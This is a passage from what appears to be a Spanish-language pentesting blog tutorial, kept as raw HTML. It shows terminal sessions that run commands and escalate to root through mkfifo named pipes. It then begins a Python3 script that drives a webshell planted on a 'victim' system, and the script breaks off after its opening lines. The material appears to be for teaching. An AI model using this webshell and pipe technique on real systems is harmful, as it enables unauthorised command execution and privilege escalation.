&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tty&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Interactive&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hola&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Hola&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sudo su&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;************&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Aquí&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pondríais&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vuestra&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contraseña&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tty&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Interactive&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hola&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Hola&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El único problema es que el fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt; va almacenando el resultado de los comandos anteriormente ejecutados desde consola introducidos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt;, por lo que por cada vez que abramos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt;, veremos este histórico.&lt;/p&gt;

&lt;p&gt;Aún así, está todo pensado… no os preocupéis. ¿Cuál es la idea ahora?, pues aprovechar este principio para construir una utilidad en Python la cual nos permita comunicarnos, mediante la webshell previamente creada, con estos ficheritos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt; depositados sobre el sistema víctima explotando para ello la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Haríamos uso de la siguiente utilidad en Python3:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AllTheReads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;interval&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
